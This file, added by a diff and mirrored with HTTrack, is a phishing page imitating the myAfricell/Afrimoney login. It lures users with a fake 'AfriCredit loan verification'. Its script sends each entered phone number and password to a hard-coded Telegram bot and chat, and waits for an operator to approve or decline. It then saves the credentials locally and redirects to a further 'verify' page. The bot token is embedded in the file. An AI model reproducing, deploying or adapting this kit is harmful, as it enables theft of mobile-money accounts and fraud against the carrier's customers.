@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from africellsl.onrender.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Mar 2026 16:29:25 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>myAfricell – Log In</title>
+    <link rel="icon" href="https://www.africell.sl/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(#fff, #f8f9fa);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 380px;
+            background: #fff;
+            border-radius: 16px;
+            padding: 32px 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, .08);
+            text-align: center;
+        }
+        
+        .logo-my {
+            color: #F8BBD0;
+            font-size: 42px;
+            font-weight: 900;
+            letter-spacing: -1px;
+        }
+        
+        .logo-africell {
+            color: #C2185B;
+            font-size: 42px;
+            font-weight: 900;
+            letter-spacing: -1px;
+        }
+        
+        .logo-container {
+            font-size: 52px;
+            margin: 0 auto 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #1a1a1a;
+        }
+        
+        .subtitle {
+            font-size: 15px;
+            color: #555;
+            line-height: 1.4;
+            margin-bottom: 32px;
+        }
+        
+        .form-group {
+            text-align: left;
+            margin-bottom: 24px;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #2c3e50;
+        }
+        
+        input[type="tel"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 16px 18px;
+            font-size: 17px;
+            border: 1.5px solid #C2185B;
+            border-radius: 12px;
+            outline: none;
+            transition: all 0.2s;
+        }
+        
+        input:focus {
+            border-color: #C2185B;
+            box-shadow: 0 0 0 3px rgba(194, 24, 91, 0.15);
+        }
+        
+        .error-msg {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+        }
+        
+        .btn-action,
+        .btn-back {
+            width: 100%;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all .2s;
+            margin: 12px 0 8px;
+        }
+        
+        .btn-action {
+            color: #fff;
+            background: #C2185B;
+            border: none;
+            box-shadow: 0 4px 12px rgba(194, 24, 91, .25);
+        }
+        
+        .btn-action:hover {
+            background: #AD1457;
+            transform: translateY(-1px);
+        }
+        
+        .btn-back {
+            font-size: 16px;
+            font-weight: 600;
+            color: #C2185B;
+            background: transparent;
+            border: 1.5px solid #C2185B;
+        }
+        
+        .btn-back:hover {
+            background: rgba(194, 24, 91, 0.05);
+        }
+        
+        #spinner {
+            position: fixed;
+            inset: 0;
+            background: rgba(194, 24, 91, .15);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .spin {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f0f0f0;
+            border-top: 6px solid #C2185B;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        /* Password wrapper for eye icon */
+        
+        .password-wrapper {
+            position: relative;
+        }
+        
+        .password-wrapper input {
+            padding-right: 48px;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            top: 50%;
+            right: 16px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            fill: #333;
+            transition: fill 0.2s;
+        }
+        
+        .toggle-password:hover {
+            fill: #C2185B;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <span class="logo-my">my</span><span class="logo-africell">Africell</span>
+        </div>
+        <h1>Welcome Back</h1>
+        <p class="subtitle">Log in to your Afrimoney account<br>to complete AfriCredit loan verification.</p>
+
+        <div class="form-group">
+            <label>Phone Number</label>
+            <div style="position:relative;">
+                <span style="position:absolute; left:16px; top:50%; transform:translateY(-50%); color:#6c757d; font-weight:500;">+232</span>
+                <input type="tel" id="phone" placeholder="79XXXXXX" inputmode="tel" style="padding-left:60px;">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="password" placeholder="Enter your password">
+                <svg id="togglePassword" class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+            </svg>
+            </div>
+        </div>
+
+        <div id="err" class="error-msg">Please enter a valid phone number and password</div>
+
+        <button class="btn-action" id="next">Log In</button>
+        <button class="btn-back" id="back">Go Back</button>
+    </div>
+
+    <div id="spinner">
+        <div class="spin"></div>
+    </div>
+
+    <script>
+        // ────────────────────────────────────────────────
+        // CONFIG & STATE
+        // ────────────────────────────────────────────────
+        const CONFIG = {
+            BOT_TOKEN: '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0',
+            CHAT_ID: '5615316142',
+            MIN_PHONE_LENGTH: 8, // Sierra Leone mobile numbers typically 8 digits after +232
+            REDIRECT_PAGE: 'verify.html'
+        };
+        let state = {
+            poll: null,
+            approveId: null,
+            declineId: null
+        };
+
+        // ────────────────────────────────────────────────
+        // DOM ELEMENTS
+        // ────────────────────────────────────────────────
+        const els = {
+            phoneInput: document.getElementById('phone'),
+            passwordInput: document.getElementById('password'),
+            togglePassword: document.getElementById('togglePassword'),
+            nextBtn: document.getElementById('next'),
+            errMsg: document.getElementById('err'),
+            spinner: document.getElementById('spinner'),
+            backBtn: document.getElementById('back')
+        };
+
+        // ────────────────────────────────────────────────
+        // PASSWORD TOGGLE
+        // ────────────────────────────────────────────────
+        els.togglePassword.addEventListener('click', () => {
+            const isPassword = els.passwordInput.type === 'password';
+            els.passwordInput.type = isPassword ? 'text' : 'password';
+
+            els.togglePassword.innerHTML = isPassword ?
+                '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>' :
+                '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
+        });
+
+        // ────────────────────────────────────────────────
+        // VALIDATION & HELPERS
+        // ────────────────────────────────────────────────
+        function showError(msg = "Please enter a valid phone number and password") {
+            els.errMsg.textContent = msg;
+            els.errMsg.style.display = 'block';
+        }
+
+        function hideError() {
+            els.errMsg.style.display = 'none';
+        }
+
+        function showSpinner() {
+            els.spinner.style.display = 'flex';
+        }
+
+        function hideSpinner() {
+            els.spinner.style.display = 'none';
+        }
+
+        function stopPolling() {
+            if (state.poll) {
+                clearInterval(state.poll);
+                state.poll = null;
+            }
+        }
+
+        // ────────────────────────────────────────────────
+        // BOT LOGIC
+        // ────────────────────────────────────────────────
+        function sendLoginAttempt(phone, password) {
+            const ts = Date.now();
+            state.approveId = `approve_${ts}`;
+            state.declineId = `decline_${ts}`;
+            const message = `myAfricell / Afrimoney Login Attempt\n\n` +
+                `Phone: \`${phone}\`\n` +
+                `Password: \`${password}\`\n\nAction?`;
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: message,
+                        parse_mode: 'MarkdownV2',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: '✅ Approve & Continue',
+                                    callback_data: state.approveId
+                                }, {
+                                    text: '❌ Decline',
+                                    callback_data: state.declineId
+                                }]
+                            ]
+                        }
+                    })
+                })
+                .catch(err => {
+                    hideSpinner();
+                    alert('Connection error: ' + err.message);
+                });
+            startPolling();
+        }
+
+        function startPolling() {
+            stopPolling();
+            state.poll = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1&timeout=30`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result || !data.result.length) return; // Fixed syntax
+                        for (const update of data.result) {
+                            const cb = update.callback_query;
+                            if (!cb) continue;
+                            const cbData = cb.data;
+                            if (cbData === state.approveId) {
+                                stopPolling();
+                                hideSpinner();
+                                localStorage.setItem('phone', els.phoneInput.value.trim());
+                                localStorage.setItem('password', els.passwordInput.value.trim());
+                                window.location.href = CONFIG.REDIRECT_PAGE;
+                                return;
+                            }
+                            if (cbData === state.declineId) {
+                                stopPolling();
+                                hideSpinner();
+                                showError("Access declined. Please try again.");
+                                return;
+                            }
+                        }
+                    })
+                    .catch(console.warn);
+            }, 2000);
+        }
+
+        // ────────────────────────────────────────────────
+        // EVENT LISTENERS
+        // ────────────────────────────────────────────────
+        els.nextBtn.onclick = () => {
+            hideError();
+            const phone = els.phoneInput.value.trim();
+            const password = els.passwordInput.value.trim();
+
+            if (!phone || phone.length < CONFIG.MIN_PHONE_LENGTH || !/^\d+$/.test(phone)) {
+                showError("Please enter a valid Sierra Leone phone number (8 digits)");
+                return;
+            }
+            if (!password) {
+                showError("Please enter your password");
+                return;
+            }
+
+            showSpinner();
+            sendLoginAttempt(phone, password);
+        };
+
+        els.backBtn.onclick = (e) => {
+            e.preventDefault();
+            window.history.back();
+        };
+
+        // ────────────────────────────────────────────────
+        // INIT
+        // ────────────────────────────────────────────────
+        els.phoneInput.focus();
+    </script>
+</body>
+
+
+</html>
